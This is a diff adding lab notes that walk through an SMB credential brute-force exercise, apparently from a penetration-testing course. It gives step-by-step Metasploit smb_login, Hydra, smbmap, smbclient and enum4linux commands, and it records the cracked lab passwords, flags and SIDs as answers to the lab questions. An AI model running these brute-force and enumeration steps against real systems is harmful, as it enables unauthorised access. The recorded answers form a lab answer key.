@@ -530,9 +530,212 @@ Now we want to get the flag file in that directory:
 `cat flag`
 **03ddb97933e716f5057a18632badb3b4**
 
+## SMB: Dictionary Attack
+
+1. **Start Metasploit Console**:
+    `msfconsole`
+    - Opens the Metasploit Framework console for further actions.
+
+2. **Select SMB Login Module**:
+    `use auxiliary/scanner/smb/smb_login`
+    - Selects the SMB login scanner module in Metasploit.
+
+3. **View Module Information**:
+    `info`
+    - Displays detailed information about the selected module.
+
+4. **View Module Options**:
+    `options`
+    - Shows the configurable options for the selected module.
+
+5. **Set Target IP**:
+    `set rhosts [targetIP]`
+    - Configures the target IP address for the module.
+
+6. **Set Password File**:
+    `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
+    - Sets the path to the password file for brute-forcing.
+
+7. **Set SMB Username**:
+    `set smbuser jane`
+    - Specifies the username to use for the login attempts.
+
+8. **Verify Options**:
+    `options`
+    - Ensures all settings are correct before running the module.
+
+9. **Run the Module**:
+   `run`
+    - Executes the SMB login scanner with the configured options.
+
+10. **Exit Metasploit Console**:
+    `exit`
+    - Exits the Metasploit console.
+
+### Decompress RockYou Wordlist
+11. **Decompress RockYou Wordlist**:
+    `gzip -d /usr/share/wordlist/rockyou.txt.gz`
+    - Decompresses the RockYou wordlist for use in brute-forcing.
+
+### Use Hydra for Brute-Forcing
+12. **Brute-Force SMB with Hydra**:
+    `hydra -l admin -P /usr/share/wordlists/rockyou.txt [target IP] smb`
+    - Uses Hydra to brute-force the SMB login with the "admin" username and the RockYou wordlist.
+
+### Check SMB Shares with smbmap
+13. **Enumerate SMB Shares**:
+    `smbmap -H [target IP] -u admin -p password1`
+    - Lists SMB shares on the target using the provided credentials.
+
+### List SMB Shares with smbclient
+14. **List SMB Shares with smbclient**:
+    `smbclient -L [target IP] -U jane`
+    - Lists SMB shares on the target using the "jane" username and "abc123" password.
+
+15. **Connect to SMB Share**:
+   `smbclient //[target IP] -U jane`
+    - Connects to the SMB share on the target using the "jane" username and "abc123" password.
+
+    smb: \> ls
+    smb: \> exit
+
+16. **Connect to Admin SMB Share**:
+    `smbclient //[target IP]/admin -U admin`
+    - Connects to the "admin" SMB share on the target using "admin" and "password1".
+
+    `smb: \> cd hidden`
+    `smb: \> ls`
+    `smb: \> get flag.tar.gz`
+    `smb: \> exit`
+
+### Extract and Read the Flag
+17. **Extract the Flag**:
+    `tar -xf flag.tar.gz`
+    - Extracts the contents of the downloaded `flag.tar.gz` file.
+
+18. **List Files**:
+    `ls`
+    - Lists the files in the current directory.
+
+19. **Read the Flag**:
+   ` cat flag`
+    - Displays the contents of the `flag` file.
+
+### Access Other Services via Pipes
+20. **Start Metasploit Console**:
+    `msfconsole`
+
+21. **Use Pipe Auditor Auxiliary Module**:
+    `use auxiliary/scanner/smb/pipe_auditor`
+
+22. **Set SMB User**:
+    `set smbuser admin`
+
+23. **Set SMB Password**:
+    `set smbpass password1`
+
+24. **Set Target IP**:
+    `set rhosts [target IP]`
+
+25. **Verify Options**:
+    `options`
+
+26. **Run the Module**:
+    `run`
+
+27. **Exit Metasploit Console**:
+    `exit`
+
+### Enumerate User SIDs with enum4linux
+28. **Get List of SIDs**:
+    `enum4linux -r -u "admin" -p "password1" [target IP]`
+    - Retrieves the list of user SIDs from the target using the provided credentials.
+   
+
+Questions
+
+    What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
+    What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
+    Which share is read only? Use smbmap with credentials obtained in question 2.
+    Is share “jane” browseable? Use credentials obtained from the 1st question.
+    Fetch the flag from share “admin”
+    List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
+    List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
 
 
+First, we need to find out the password of user "jane" required to access share "jane", using the smb_login metasploit module:
+As mentioned, we use the Metasploit module "smb_login":
+`msfconsole`
+`use auxiliary/scanner/smb/smb_login`
+`set rhosts 192.26.71.3`
+`set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
+`set smbuser jane`
+`options`
+`run`
+**we see, that jane has following password: abc123**
 
+We want to brute force login into the smb server: 
+`gzip -d /usr/share/wordlist/rockyou.txt.gz`
+`hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.26.71.3 smb`
+**Login successful**
 
+We need to enumerate which share is read only:
+`smbmap -H 192.26.71.3 -u admin -p password1`
+**nancy share is read only**
 
+Is share "jane" browsable?
+`smbclient -L 192.26.71.3 -U jane`
+**yes, its browsable**
+
+We want to fetch the flag from share "admin":
+
+Connect to Admin SMB Share:
+    `smbclient //[target IP]/admin -U admin`
+        `smb: \> cd hidden`
+        `smb: \> ls`
+        `smb: \> get flag.tar.gz`
+        `smb: \> exit`
+
+**Extract the Flag**:
+    `tar -xf flag.tar.gz`
     
+**List Files**:
+    `ls`
+
+**Read the Flag**:
+   `cat flag`
+    - Displays the contents of the `flag` file.
+
+**flag: 2727069bc058053bd561ce372721c92e**
+
+We want to check the pipes available:
+`msfconsole`
+
+**Use Pipe Auditor Auxiliary Module**:
+    `use auxiliary/scanner/smb/pipe_auditor`
+
+**Set SMB User**:
+    `set smbuser admin`
+**Set SMB Password**:
+    `set smbpass password1`
+
+**Set Target IP**:
+    `set rhosts [target IP]`
+
+**Verify Options**:
+    `options`
+
+**Run the Module**:
+    `run`
+
+**Exit Metasploit Console**:
+    `exit`
+
+**Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc**
+
+We want to get the SID's from the users on the target:
+`enum4linux -r -u "admin" -p "password1" 192.26.71.3`
+**S-1-22-1-1000 Unix User\shawn (Local User)
+S-1-22-1-1001 Unix User\jane (Local User)
+S-1-22-1-1002 Unix User\nancy (Local User)
+S-1-22-1-1003 Unix User\admin (Local User)**
